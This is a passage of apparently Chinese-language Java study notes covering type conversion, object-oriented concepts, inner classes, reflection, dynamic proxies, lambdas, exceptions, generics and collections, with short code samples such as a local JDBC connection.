&quot;XL&quot;;        break;&#125;\n\n\n\n\n\n数值类型转换数值类型转换中int转float，long转double可能产生精度损失。\n自动类型转换\n二元运算符在计算前会先将两个操作数转换为同一类型，如果有一个操作数是double&#x2F;float&#x2F;long，另一个操作数是byte&#x2F;short&#x2F;char&#x2F;int，则另一个操作数就会被转换为double&#x2F;float&#x2F;long。double&#x2F;float&#x2F;long之间的自动类型转换的优先顺序是，long类型能自动转换为float或double类型，float类型能自动转换为double类型。\n强制类型转换\n对于可能丢失信息的转换需要通过强制类型转换完成。\n浮点数转换为整数时会截断小数位。\n数学函数MathMath.pow方法：进行幂运算，Java中没有完成幂运算的运算符\nMath.round方法：舍入（round）浮点数来得到最接近的整数\nMath.ramdom方法：返回一个0到1（包含0，不包含1）之间的随机浮点数，用n乘以这个浮点数，可以得到从0到n-1之间的一个随机数。例如：int result = (int) (Math.random() * n);\n面向对象编程的概念封装（encapsulation）\n从形式上看，封装就是将数据和行为组合在一个包中，并对对象的使用者隐藏具体的实现细节。\n实现封装的关键在于，不能让其它类中的方法直接访问被封装的类的实例字段，程序只能通过对象的方法与对象的数据进行交互。这意味着一个类可以完全改变存储数据的方式，只要仍旧向外提供同样的方法，调用该方法的对象不需要关心这个类所发生的变化。\n继承（Inheritance）\n继承可以让实现Java类变得更容易，因为可以通过继承（extends、implements）其它类来构建新类。\n多态（Polymorphism）\n多态是指在父类或接口类型上使用不同的子类对象，以实现同一个方法的多种不同行为。一个父类变量既可以引用父类对象，也可以引用其任何一个子类的对象。多态的实现方式是，在继承的基础上，子类覆盖从父类中继承的方法。\n方法方法参数方法参数能否改变的规则\n\n方法不能改变基本数据类型的参数\n方法不能改变对象参数的引用对象\n方法可以改变对象参数的状态，即方法可以改变传入的对象内部的变量。\n\n变长参数\n在 Java 5 中提供了变长参数，允许在调用方法时传入不定长度的参数。变长参数是 Java 的一个语法糖，本质上还是基于数组的实现。\n定义变长参数的方法是，在最后一个形参后加上三点 …，就表示该形参可以接受多个参数值，需要注意的是：\n\n可变参数只能作为函数的最后一个参数，但其前面可以有也可以没有任何其他参数\n由于可变参数必须是最后一个参数，所以一个函数最多只能有一个可变参数\nJava的可变参数，会被编译器转型为一个数组\n\n重载重载（orverloading）指的是一个类的多个方法有相同的参数名，但是有不同的参数。\n覆盖覆盖（override），又叫重写，指的是子类提供从父类中继承的方法的新的实现。\n继承继承的基本思想是基于已有的类创建新的类。\n\nJava和C++的不同：\nJava中继承是使用关键字extends，而C++中是使用冒号（:）\nJava中所有的继承都是公共继承，没有C++中的私有继承和保护继承。\n\n在覆盖一个方法的时候，子类的方法不能低于超类方法的可见性。\nfinal类和final方法final能够阻止类的继承，以及方法的覆盖。\nprotected访问修饰符protected是Java的一个访问修饰符（access modifier）。\n当一个类的成员被声明为 protected，意味着它只能被以下两种情况下的代码访问：\n\n在同一包内的其他类\n所有（在同一包或不同包中）的子类\n\n\n注意：\n如果在Java中不指定类中某个方法的访问修饰符，则默认使用包级私有（package-private）修饰符，而不是protected修饰符。\n\n对象与类类之间的关系\n\n\n关系\n含义\nUML（Unified Modeling Language）连接符\n关系强弱\n\n\n\n实现（Implementation，is-a）\nimplements interface\n虚线+三角实心箭头\n\n\n\n继承（Inheritance，is-a）\ninherits from\n实线+三角实心箭头\n\n\n\n依赖（Dependency，uses-a）\ndepend on\n虚线+三线箭头\n弱（如成员函数里的局部变量）\n\n\n关联（Association，uses-a）\nis associated with\n实线+三线箭头\n强（如成员变量）\n\n\n聚合（Aggregation，has-a）\nis an aggregate of\n空心菱形箭头+实线\n弱\n\n\n组合（Composition，has-a）\nis composed of\n实心菱形箭头+实线\n强\n\n\n\n\n\n\n\n\n抽象类\nJava和C++的不同：\n在C++中，抽象方法称为纯虚函数（pure virtual function），要在末尾用&#x3D;0标记，没有用于表示抽象类的特殊关键字。\n\n枚举类在比较枚举类的值时，不需要使用equals，可以之间使用&#x3D;&#x3D;来比较。\n枚举类可以有构造器、方法和字段。\n有构造器、方法和字段的枚举类示例：\npublic enum Size &#123;    SMALL(&quot;S&quot;), MEDIUM(&quot;M&quot;), LARGE(&quot;L&quot;), EXTRA_LARGE(&quot;XL&quot;);    private final String abbreviation;    Size(String abbreviation) &#123;        this.abbreviation = abbreviation;    &#125;    public String getAbbreviation() &#123;        return abbreviation;    &#125;&#125;\n\n所有枚举类型都是抽象类Enum的子类。\n内部类内部类（inner class）是定义在类中的类。\n内部类的分类：\n\n\n非静态的\nInner Classes：非静态内部类，又称成员内部类\nMethod Local Inner Classes：方法局部内部类\nAnnonymous Inner Classes：匿名内部类\n\n\n静态的（类的前面多了一个关键字static）\nStatic Nested Classes：静态内部类\n\n\n\n非静态内部类访问成员的规则\n\n非静态内部类可以访问外部类的所有（包括private成员和静态成员）成员变量和方法，可以修改外部类的非final类型的成员变量。\n当非静态内部类拥有和外部类同名的成员变量或者方法时，会发生隐藏现象，即默认情况下访问的是非静态内部类的成员。如果要访问外部类的同名成员，需要以下面的形式进行访问：\n外部类.this.成员变量外部类.this.成员方法\n\n在外部类中如果要访问非静态内部类的成员，必须先创建一个非静态内部类的对象，再通过指向这个对象的引用来访问。\n\n\n创建的方法\n非静态内部类是依附外部类而存在的，也就是说，如果要创建非静态内部类的对象，只能使用外部类的对象来创建。\n//必须先创建一个外部类的对象Outter outter = new Outter();Outter.Inner inner = outter.new Inner();  //必须通过Outter对象来创建\n\n访问权限修饰\n非静态内部类可以拥有 private 访问权限、protected 访问权限、public 访问权限及包访问权限。比如上面的例子，如果非静态内部类 Inner 用 private 修饰，则只能在外部类的内部访问，如果用 public 修饰，则任何地方都能访问；如果用 protected 修饰，则只能在同一个包下或者继承外部类的情况下访问；如果是默认访问权限，则只能在同一个包下访问。\n静态内部类访问成员的规则\n\n静态内部类可以直接访问外部类的静态成员变量和静态方法，可以修改外部类的非final类型的静态成员变量。如果要访问外部类的实例成员，需要通过外部类的实例去访问。\n外部类以外的其他类需要通过完整的类名访问静态内部类中的静态成员。如果要访问静态内部类中的实例成员，则需要通过静态内部类的实例。\n\n创建的方法\n在创建静态内部类的实例时，不需要创建外部类的实例。\n方法局部内部类方法局部内部类是定义在一个方法或者一个作用域里面的类。方法局部内部类只在当前方法中有效。\n实现规则\n\n方法局部内部类与局部变量一样，不能使用访问控制修饰符（public、private 和 protected）和 static 修饰符修饰。\n方法局部内部类中还可以包含方法局部内部类，但是这些方法局部内部类也不能使用访问控制修饰符（public、private 和 protected）和 static 修饰符修饰。\n\n访问成员的规则\n\n方法局部内部类可以访问外部类的方法和final或等效于final类型的成员变量（所以不能修改外部类的成员变量）。如果内部类中的成员与外部类中的成员同名，则可以使用 &lt;OuterClassName&gt;.this.&lt;MemberName&gt; 的形式访问外部类中的成员。\n方法局部内部类只能访问所属方法的final或等效于final类型的局部变量和形参。\n\n匿名内部类匿名内部类是指没有类名的内部类，通常用于只需要临时实现某个接口或抽象类的情况，从而避免编写额外的类定义。在创建匿名内部类时，必须使用 new 语句来声明类。其语法形式如下：\nnew [类名或接口名](/2023/05/02/Java%E5%9F%BA%E7%A1%80/) &#123;    // 类的主体&#125;;\n\n匿名内部类不能是静态的。\n实现方法\n匿名类有两种实现方式：\n\n继承一个父类，重写其方法。\n实现一个接口，实现其方法。\n\n访问成员的规则（和方法局部内部类一样）\n\n匿名内部类可以访问外部类的方法和final或等效于final类型的成员变量（所以不能修改外部类的成员变量），如果内部类中的成员与外部类中的成员同名，则可以使用 &lt;OuterClassName&gt;.this.&lt;MemberName&gt; 的形式访问外部类中的成员。\n如果匿名内部类位于一个方法中，则匿名内部类只能访问所属方法的final或等效于final类型的局部变量和形参。\n\nCloneableCloneable 是一个标记接口（marker interface），用于指示一个类可以被克隆（clone）。\n要让一个类可以被克隆，需要满足两个条件：\n\n类实现 Cloneable 接口。\n重写 clone() 方法，实现对象的克隆逻辑。\n\nObject类equals方法Object类中的equals方法的默认实现是比较两个对象的引用地址（即内存地址）是否相同。所以如果需要比较两个对象中参数是否一致，就需要覆盖该equals方法。\nJava规范要求equals方法具有如下特性：\n\n自反性：对于非null的引用x，x.equals(x)应返回true。\n对称性：对于非null的引用x、y，x.equals(y)返回true时，y.equals(x)也要返回true。\n传递性：对于非null的引用x、y、z，x.equals(y)返回true且y.equals(z)返回true，则x.equals(z)返回true。\n一致性：如果x，y引用的对象没有发送变化，则反复调用x.equals(y)应该返回相同的结果。\n对于非null的引用x，x.equals(null)应返回false。\n\nhashCode方法Java中，散列码（hash code）是由对象导出的一个整型值（可以是负数）。\n内容相同的字符串有相同的散列码，这是因为字符串的散列码是由内容导出的。\n如果一个类覆盖了equals方法，则该类必须也覆盖hashCode方法。如果两个对象通过 equals 方法比较相等，那么它们的 hashCode 必须相等。比如如果equals方法比较的是参数id，那么hashCode方法就需要对id计算散列值，且不考虑其它的参数。\nequals方法和hashCode方法的结果值要一样，是因为在使用哈希表（如HashMap、HashSet等）进行查找和存储时，首先会根据对象的hashCode值确定其在哈希表中的位置（所以hashCode值相等的两个对象不一定相等，hashCode值不相等的两个对象一定不相等）；然后，如果该位置上已经存在其他对象，就再使用equals方法来比较这两个对象是否相等。\n如果equals方法和hashCode方法的结果值不一致，相等的对象会被错误地判断为不相等。\n\n提示：\n如果有数组类型的字段，那么可以使用静态的Arrays.hashCode方法计算一个散列码，该散列码有数组元素的散列码组成。\n\ngetClass方法Object类提供了getClass方法，返回值是对象的运行时类的Class对象。\n调用getClass().getName()可以得到对象的类名。\n反射概述反射（reflection）是在程序运行期间获取类的信息（如类名、类的方法、类的属性等信息）并进行操作（如创建对象、调用方法等操作）的技术。\n反射机制的核心类Java 反射机制的核心类包括“java.lang”包下的Class 类，以及“ java.lang.reflect”包下的Constructor类、Method类、Field类、Modifier类。这些类可以让我们在运行时动态地获取类的相关信息，并进行相应的操作。例如，我们可以使用Constructor类的newInstance()方法创建对象；使用Method 类中的 invoke() 方法来调用一个指定方法；使用 Field 类的 get() 和 set() 方法来读取或修改一个对象的属性值；使用Modifier类的isPublic()方法来判断类的修饰符是否是public。\nClass类虚拟机中每个类型只有唯一的Class对象，因此可以使用&#x3D;&#x3D;运算符比较两个类对象是否相等。\nClass类的部分方法示例：\n\ngetName方法，由获取的Class类对象获取类的全限定名（fully qualified name）\nInteger object = 1;Class classObject = object.getClass();//获取Class类对象String name = classObject.getName();\n\nforName方法，由类的全限定名获取Class类对象\nClass classObject;String name = &quot;java.lang.Integer&quot;;try &#123;\tclassObject = Class.forName(name);&#125; catch (ClassNotFoundException e) &#123;\tthrow new RuntimeException(e);&#125;\n\n由类型获取Class类对象\nClass classObject1 = Integer.class;Class classObject2 = int.class; //int不是类，但是int.Class是类对象\n\ngetConstructor方法，由Class类对象获取构造器\nClass classObject = TestGetLClass.class;try &#123;\tObject obj = classObject.getConstructor().newInstance();&#125; catch (InstantiationException | IllegalAccessException | InvocationTargetException | NoSuchMethodException e) &#123;\tthrow new RuntimeException(e);&#125;\n\nConstructorConstructor类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic T newInstance(Object … initargs)\n根据传递的参数创建类的对象\n\n\nMethodMethod类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic Object invoke(Object obj, Object… args)\ninvoke 方法是 Java 反射 API 中 Method 类的一个重要方法，用于调用方法并执行其逻辑。通过 invoke 方法，可以在运行时动态地调用特定对象上的方法，并传递参数。\n\n\npublic String getName()\n获取方法的名称\n\n\npublic &lt;T extends Annotation&gt; T getAnnotation(Class&lt;T&gt; annotationClass)\n获取指定类型的注解对象，如果存在的话\n\n\npublic Annotation[] getDeclaredAnnotations()\n获取由所有注解对象组成的数组\n\n\nFieldField类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic int getInt(Object obj)\n获取对象中指定类型（此处为int类型）的变量值\n\n\npublic void setInt(Object obj, int i)\n设置对象中指定类型（此处为int类型）的变量值\n\n\npublic &lt;T extends Annotation&gt; T getAnnotation(Class&lt;T&gt; annotationClass)\n获取指定注解类型的注解对象\n\n\nModifierModifier类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic static boolean isPublic(int mod)\n根据传递的参数判断是否包含public\n\n\n反射的应用JDBC 的数据库的连接在JDBC 的操作中，如果要想进行数据库的连接，则必须按照以上的几步完成\n\n通过Class.forName()加载数据库的驱动程序 （通过反射加载，前提是引入相关了Jar包）\n通过 DriverManager 类进行数据库的连接，连接的时候要输入数据库的连接地址、用户名、密码\n通过Connection 接口接收连接\n\npublic class ConnectionJDBC &#123;      /**      * @param args      */      //驱动程序就是之前在classpath中配置的JDBC的驱动程序的JAR 包中      public static final String DBDRIVER = &quot;com.mysql.jdbc.Driver&quot;;      //连接地址是由各个数据库生产商单独提供的     public static final String DBURL = &quot;jdbc:mysql://localhost:3306/test&quot;;      //连接数据库的用户名      public static final String DBUSER = &quot;root&quot;;      //连接数据库的密码      public static final String DBPASS = &quot;&quot;;                  public static void main(String[] args) throws Exception &#123;          Connection con = null; //表示数据库的连接对象          Class.forName(DBDRIVER); //1、使用CLASS 类加载驱动程序 ,反射机制的体现         con = DriverManager.getConnection(DBURL,DBUSER,DBPASS); //2、连接数据库          System.out.println(con);          con.close(); // 3、关闭数据库      &#125;    /*    //还可以使用try-with-resources语句，来自动关闭数据库连接    try (Connection con = DriverManager.getConnection(DBURL, DBUSER, DBPASS)) &#123;        System.out.println(con);    &#125; catch (Exception e) &#123;        // 处理异常    &#125;    */&#125;\n\nSpring 框架的IoC在 Java的反射机制在做基础框架的时候非常有用，行内有一句这样的老话：反射机制是Java框架的基石。一般应用层面很少用，不过这种东西，现在很多开源框架基本都已经封装好了，自己基本用不着写。除了JDBC之外，Spring框架的实现也用到很多反射机制。最经典的就是xml的配置模式。\nSpring 通过 XML 配置模式装载 Bean 的过程：\n\n将程序内所有 XML 或 Properties 配置文件加载入内存中\nJava类里面解析xml或properties里面的内容，得到对应实体类的字节码字符串以及相关的属性信息\n使用反射机制，根据这个字符串获得某个类的Class实例\n动态配置实例的属性\n\nSpring这样做的好处是：\n\n不用每一次都要在代码里面去new或者做其他的事情\n以后要改的话直接改配置文件，代码维护起来就很方便了\n\n代理概述代理（proxy）是在运行时创建接口的代理类或代理对象的技术。\n代理模式分为静态代理和动态代理两种。\n静态代理和动态代理最主要的区别是：静态代理在代码运行之前，代理类的.class文件就已经存在，而动态代理则与静态代理相反，在代码运行之前不存在代理类的.class文件，在代码运行时才动态的生成代理类。\n代理和反射的关系反射和代理之间的关系是：通过反射可以创建动态代理对象。\nJava中的动态代理是一种利用反射机制在运行时动态地创建代理对象的技术。通过动态代理，可以在运行时创建代理类和代理对象，并将方法的调用转发给代理对象的调用处理程序（如InvocationHandler的invoke方法）来处理，在方法调用前后执行一些额外的操作，例如记录日志、检查权限、实现缓存等。\nJDK动态代理机制核心类Java代理机制的核心类包括java.lang.reflect.Proxy类和java.lang.reflect.InvocationHandler接口。Proxy类用于创建代理类和代理对象，而InvocationHandler接口定义了调用代理对象的处理程序。\n创建代理对象的方法是调用Proxy类中的newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)方法，该方法的三个参数分别是类加载器（用于加载代理对象）、一组被代理类实现的接口、实现类InvocationHandler接口的对象（需要自定义InvocationHandler接口的实现类来自定义处理逻辑）。\n在代理对象调用方法时，实际上是调用了InvocationHandler的invoke方法。\n使用步骤\n定义一个接口及其实现类（被代理的类）；\n自定义 InvocationHandler 并重写invoke方法，在 invoke 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；\n通过 Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) 方法创建代理对象；\n\nCGLIB动态代理机制JDK 动态代理有一个最致命的问题是其只能代理实现了接口的类。\n为了解决这个问题，我们可以用 CGLIB 动态代理机制来避免。\nCGLIB(Code Generation Library)是一个基于ASM（Abstract Syntax Tree Manipulation，抽象语法树操作，是一个Java字节码操作框，提供了一组API，用于读取、修改和生成Java字节码）的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。\nCGLIB 通过继承方式实现代理。很多知名的开源框架都使用到了CGLIB， 例如 Spring 中的 AOP 模块（如果目标对象实现了接口，则默认采用 JDK 动态代理，否则采用 CGLIB 动态代理）。\n核心类CGLIB代理机制的核心类包括Enhancer类和MethodInterceptor接口。Enhancer类用于创建代理类和代理对象，而MethodInterceptor接口定义了调用代理对象的处理程序。\n当代理类调用方法的时候，实际调用的是 MethodInterceptor 中的 intercept 方法。需要自定义 MethodInterceptor 接口的实现类并实现 intercept 方法，intercept是用于拦截增强被代理类的方法。\n使用步骤\n添加CGLIB的依赖；\n定义一个类（被代理的类）；\n自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法，和 JDK 动态代理中的 invoke 方法类似；\n通过 Enhancer 类的 create()创建代理类；\n\n代理的应用\nRPC框架：如Dubbo、gRPC等，通常使用动态代理来实现客户端的远程方法调用。客户端通过动态代理对象来调用远程方法，不需要直接关注底层的网络通信细节。还可以通过动态代理在方法调用的前后添加一些额外的逻辑，比如实现负载均衡、服务治理、日志记录等。\nAOP（面向切面编程）：如Spring的AOP特性，就是利用代理机制实现对方法的增强。通过在程序运行期间动态地将额外的代码（称为切面）织入到现有的代码中，实现对系统的横切关注点（cross-cutting concerns）的管理。\n\n接口定位和特性接口（interface）用来描述类应该做什么（一组需求），而不指定应该怎么做（静态方法除外，从Java8开始允许在接口中增加静态方法包括方法的实现）。接口中除了可以声明方法，还可以定义静态常量。\n接口中的所有方法都默认是public方法，因此在接口中声明方法时，可以不提供关键字public，不过在实现接口时必须把方法声明为public；接口中的所有常量的类型默认是public static final类型，可以不提供关键字public static final。\n每个类只能有一个父类，但可以有多个接口。\n\nJava和C++的不同：\nJava只允许有一个父类，C++可以有多个父类。\nJava和C++都有抽象类的概念，但是C++中没有接口的概念。\n\n默认方法可以为接口中的方法提供一个默认实现，方法是在方法上添加default修饰符。\nLambda表达式Lambda表达式是一种用来创建代码块的简洁的方法。\n语法\n(参数列表) -&gt; 表达式\n\n即使Lambda表达式没有参数，仍然要带有括号。\nLambda表达式的示例：\n\n无参数的Lambda表达式： () -&gt; System.out.println(“Hello, Lambda!”);\n单个参数的Lambda表达式： (x) -&gt; System.out.println(“The value is: “ + x);\n多个参数的Lambda表达式： (x, y) -&gt; { int sum &#x3D; x + y; System.out.println(“The sum is: “ + sum); };\nLambda表达式作为方法的参数： Arrays.asList(1, 2, 3, 4, 5).forEach(n -&gt; System.out.println(n));\n\nLambda表达式中的变量必须是final或等效于final的（final or effectively final）。所谓“等效于 final”，指的是变量虽然没有被声明为 final，但它的值在整个 Lambda 表达式中没有被重新赋值。\n函数式接口函数式接口是一种特殊的接口，接口内部除静态方法、默认方法、静态常量外只有一个抽象方法。\n只有函数式接口才能使用Lambda表达式。\n在Java中，使用@FunctionalInterface注解来标记一个接口为函数式接口，这样编译器就可以检查这个接口是否符合函数式接口的要求（即只有一个抽象方法）。\n方法引用Java方法引用是一种Lambda表达式的简化写法，它可以直接引用已有Java方法来作为Lambda表达式的实现。\n使用方法是，通过::操作符将一个已有方法的引用赋值给一个函数式接口变量，从而创建一个方法引用。\n Java 中 4 种不同方法的引用：\n\n构造器引用：它的语法是Class::new，或者更一般的Class&lt; T &gt;::new实例如下：\nfinal Car car = Car.create( Car::new ); final List&lt; Car &gt; cars = Arrays.asList( car );\n\n静态方法引用：它的语法是Class::static_method，实例如下：\ncars.forEach( Car::collide );\n\n特定类的任意对象的方法引用：它的语法是Class::method实例如下：\ncars.forEach( Car::repair );\n\n特定对象的方法引用：它的语法是instance::method实例如下：\nfinal Car police = Car.create( Car::new ); cars.forEach( police::follow );\n\n@FunctionalInterfacepublic interface Supplier&lt;T&gt; &#123;    T get();&#125; class Car &#123;    //Supplier是jdk1.8的接口，这里和lamda一起使用了    public static Car create(final Supplier&lt;Car&gt; supplier) &#123;        return supplier.get();    &#125;     public static void collide(final Car car) &#123;        System.out.println(&quot;Collided &quot; + car.toString());    &#125;     public void follow(final Car another) &#123;        System.out.println(&quot;Following the &quot; + another.toString());    &#125;     public void repair() &#123;        System.out.println(&quot;Repaired &quot; + this.toString());    &#125;&#125;\n\n闭包闭包（Closure）指的是一个函数（或者方法），可以引用到自己作用域以外的变量。\nJava中的Lambda表达式是闭包，Lambda表达式可以引用其作用域之外的变量，不过，Lambda表达式中引用的作用域外的变量不能被改变。\n异常和错误概述Java中所有的异常（Exception）类型和错误（Error）类型都是 Throwable 类的子类，继承关系见下图。\n\nException ：程序可以处理的异常，可以通过 catch 来进行捕获。Exception 又可以分为 Checked Exception (受检查异常，必须处理) 和 Unchecked Exception (不受检查异常，可以不处理)。\n\nChecked Exception：受检查异常 ，Java 代码在编译过程中，如果受检查异常没有被 catch或者throws 关键字处理的话，就没办法通过编译。\n除了RuntimeException及其子类以外，其他的Exception类及其子类都属于受检查异常 。常见的受检查异常有：IO 相关的异常、ClassNotFoundException、SQLException…。\n\nUnchecked Exception：即不受检查异常 ，Java 代码在编译过程中 ，我们即使不处理不受检查异常也可以正常通过编译。\nRuntimeException 及其子类都统称为非受检查异常，常见的有NullPointerException(空指针错误)、IllegalArgumentException(参数错误比如方法入参类型错误)、NumberFormatException（字符串转换为数字格式错误，IllegalArgumentException的子类）、ArrayIndexOutOfBoundsException（数组越界错误）、ClassCastException（类型转换错误）、ArithmeticException（算术错误）、SecurityException （安全错误比如权限不够）、UnsupportedOperationException(不支持的操作错误比如重复创建同一用户)。\n\n\n\nError：程序无法处理的错误 ，不能通过 catch 来进行捕获。如果发生，Java 虚拟机（JVM）会选择终止进程。\n\n\n\n Throwable类常用方法：\n\n\n\n方法名\n作用\n\n\n\nprintStackTrace\n将Throwable的路径信息打印到标准错误流\n\n\ntoString\n返回Throwable的类名和message\n\n\ngetMessage\n返回Throwable的message（message是调用Exception时传入的参数）\n\n\ngetLocalizedMessage\n返回Throwable的本地化message\n\n\ntry-catch-finallyfinally块里代码是在return前执行的。当在 try 块或 catch 块中遇到 return 语句时，就会执行finally 语句块。\n当 try 语句块和 finally 语句块中都有 return 语句时，try 语句块中的 return 语句会被忽略，因为在执行完finally 语句块后已经return，不会再回到try语句块。\n在某些情况下，finally 中的代码不会被执行。比如如果finally之前虚拟机被终止运行，则finally中的代码就不会被执行。\ntry-with-resource在 Java 中，可以使用 try-with-resources （Java7引入）语句来自动关闭实现了 AutoCloseable 或（两个中的任意一个即可） Closeable 接口（使用的前提条件）的资源。\n关闭资源在try-with-resource中的执行顺序：在 try-with-resources 语句中，在 try 块的代码执行完毕后，会自动关闭在 try 声明中的资源。任何 catch 或 finally 块都会在声明的资源关闭后运行。\n\n《Effective Java》中明确指出：\n面对必须要关闭的资源，我们总是应该优先使用 try-with-resources 而不是try-finally。随之产生的代码更简短，更清晰，产生的异常对我们也更有用。try-with-resources语句让我们更容易编写必须要关闭的资源的代码，若采用try-finally则几乎做不到这点。\n\n部分支持try-with-resource的类：\n\nNIO 相关类\n\nChannel 相关类\nAbstractInterruptibleChannel: NIO 抽象通道的基类，提供了可中断的通道操作。\nAbstractSelectableChannel: NIO 抽象可选择通道的基类，提供了选择器注册和取消注册的功能。\nAbstractSelector: NIO 抽象选择器的基类，提供了选择通道的功能。\nAsynchronousFileChannel: 异步文件通道，提供了异步读写文件的能力。\nAsynchronousServerSocketChannel: 异步服务器套接字通道，用于异步处理客户端连接请求。\nAsynchronousSocketChannel: 异步套接字通道，用于异步进行套接字通信。\n\n\n\n\nIO 类\n\n字节流\n\nFileInputStream: 文件输入流，用于从文件中读取字节数据。\nFileOutputStream: 文件输出流，用于向文件中写入字节数据。\nBufferedInputStream: 带缓冲的输入流，提供了高效的读取功能。\nBufferedOutputStream: 带缓冲的输出流，提供了高效的写入功能。\nByteArrayInputStream: 字节数组输入流，用于从字节数组中读取数据。\nByteArrayOutputStream: 字节数组输出流，用于向字节数组中写入数据。\nDataInputStream: 数据输入流，用于读取基本数据类型。\nDataOutputStream: 数据输出流，用于写入基本数据类型。\nObjectInputStream: 对象输入流，用于读取对象数据。\nObjectOutputStream: 对象输出流，用于写入对象数据。\nPipedInputStream: 管道输入流，用于在多个线程之间进行字节数据的通信。\nPipedOutputStream: 管道输出流，用于在多个线程之间进行字节数据的通信。\nSequenceInputStream: 序列输入流，用于将多个输入流串联起来顺序读取数据。\n\n\n字符流\n\nFileReader: 文件字符输入流，用于从文件中读取字符数据。\nFileWriter: 文件字符输出流，用于向文件中写入字符数据。\nBufferedReader: 带缓冲的字符输入流，提供了逐行读取文本数据的功能。\nBufferedWriter: 带缓冲的字符输出流，提供了逐行写入文本数据的功能。\nCharArrayReader: 字符数组输入流，用于从字符数组中读取数据。\nCharArrayWriter: 字符数组输出流，用于向字符数组中写入数据。\nInputStreamReader: 字节流到字符流的桥接器，用于将字节流转换为字符流。\nOutputStreamWriter: 字符流到字节流的桥接器，用于将字符流转换为字节流。\nStringReader: 字符串输入流，\n\n\n\n\n\n泛型概述Java泛型（Generics）是 JDK 5 中引入的一个新特性。\n泛型一般有三种使用方式：泛型类、泛型接口、泛型方法。\n\nJava和C++的不同：\nJava中的泛型没有C++中的特殊template关键字。\n\n泛型类型参数在Java中，泛型类型参数常用的命名约定如下：\n\nT：表示泛型类型的参数。它是最常用的泛型类型参数名称，通常表示任意类型，例如public class Box&lt;T&gt;。\nE：表示集合中的元素类型的参数。它常用于表示集合类中的元素类型，例如List&lt;E&gt;。\nK：表示映射中的键类型的参数。它通常用于表示键-值对中的键类型，例如Map&lt;K, V&gt;。\nV：表示映射中的值类型的参数。它通常用于表示键-值对中的值类型，例如Map&lt;K, V&gt;。\n\nT、E、K和V只是通用的命名约定，并没有强制规定使用这些字母。在实际使用中，可以根据上下文和需求来选择更有意义的类型参数名称。\n通配符?通配符（wildcard type）?代表某种未知类型。\n通配符?的使用方法包括：\n\n?：无界通配符\n表示类型参数可以是任何类型，相当于未知类型。\n\n\n：上界通配符\n- 表示类型参数是Employee或Employee的子类，即类型参数的上界是Employee。\n- 使用这种通配符时，只能从泛型集合中**获取数据**（获取的数据是Employee类型或Employee类型的子类类型的对象，一定可以被Employee类型的对象接收，如果需要具体的子类类型，可以通过强制类型转换来实现），不能向泛型集合中添加数据，因为无法确定是Employee还是Employee的某个子类。\n：下界通配符\n- 表示类型参数是People或People的父类，即类型参数的下界是People。\n- 使用这种通配符时，只能向泛型集合中**添加数据**（添加的数据是People类型或People类型的子类类型的对象，一定能被People类型的对象接收），不能从泛型集合中获取数据，因为无法确定是People还是People的某个父类。\n\n集合概述Java 集合， 也叫作容器，主要是由两大接口派生而来：一个是 Collection接口，主要用于存放单一元素；另一个是 Map 接口，主要用于存放键值对。对于Collection 接口，下面又有三个主要的子接口：List、Set 和 Queue。\n\n注：图中只列举了主要的继承派生关系，并没有列举所有关系。比方省略了AbstractList, NavigableSet等抽象类以及其他的一些辅助类\n集合类型及分类Map（Key是唯一的）\n\nHashMap：JDK1.8 以后在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。HashMap 默认的初始化大小为 16，之后每次扩充，容量变为原来的 2 倍。\nLinkedHashMap：继承了 HashMap，底层也是基于数组和红黑树的。在HashMap结构的基础上，增加了一条双向链表，可以保持键值对的插入顺序，并且支持访问顺序（访问元素后移动元素的位置）相关的操作。详细可以查看：《LinkedHashMap 源码详细分析（JDK1.8）》\nTreeMap：红黑树（自平衡的排序二叉树），实现了NavigableMap接口（对集合内元素的搜索）和SortedMap 接口（对集合中的元素根据键排序，默认是按 key 的升序排序，可以自定义排序的比较器）。相比于HashMap来说 TreeMap 主要多了对集合中的元素根据键排序的能力。\n\nSet（元素唯一）\n\nHashSet：底层使用 HashMap 对象保存元素，与 HashMap 的区别是 HashSet不能存储键值对。HashSet的两个特性是无序性和不可重复性：\n\n无序性是指存储的数据在底层数组中并非按照数组索引的顺序添加 ，而是根据数据的哈希值决定的。无序性不等于随机性。\n\n不可重复性是指元素不重复。\n\nHashSet判断元素是否重复的方法（引自《Head first java》第二版）：\n当你把对象加入HashSet时，HashSet 会先计算对象的hashcode值来判断对象加入的位置，同时也会与其他加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用equals()方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让加入操作成功。\n\n\n\n\nLinkedHashSet：继承了HashSet，在HashSet结构的基础上，增加了一条双向链表，可以保持键值对的插入顺序。\n\nTreeSet： 底层使用TreeMap对象保存元素，与TreeMap的区别是TreeSet不能存储键值对。\n\n\nList\n\nArrayList：底层是基于数组实现的。\nLinkedList：底层是基于双向链表实现的（JDK1.6 之前为循环链表，JDK1.7 取消了循环）。\n\nQueue\n\nPriorityQueue：底层是使用Object[] 数组实现的二叉堆。\nArrayQueue：底层是Object[] 数组，并且有两个分别指向队列头部和尾部的指针。\nLinkedList：既属于Queue又属于List。\n\nSet的两大特性\n无序性\n无序性是指存储的数据在底层数组中并非按照数组索引的顺序添加 ，而是根据数据的哈希值决定的。无序性不等于随机性。\n\n不可重复性\n\n\n是否支持存储null\n\n\n类别\n类型\n是否支持存储null\n补充\n\n\n\nMap\nHashMap\n是\nnull作为key只能有一个，null 作为value可以有多个\n\n\n\nLinkedHashMap\n是\n\n\n\n\nTreeMap\n否\nkey不能为空，value 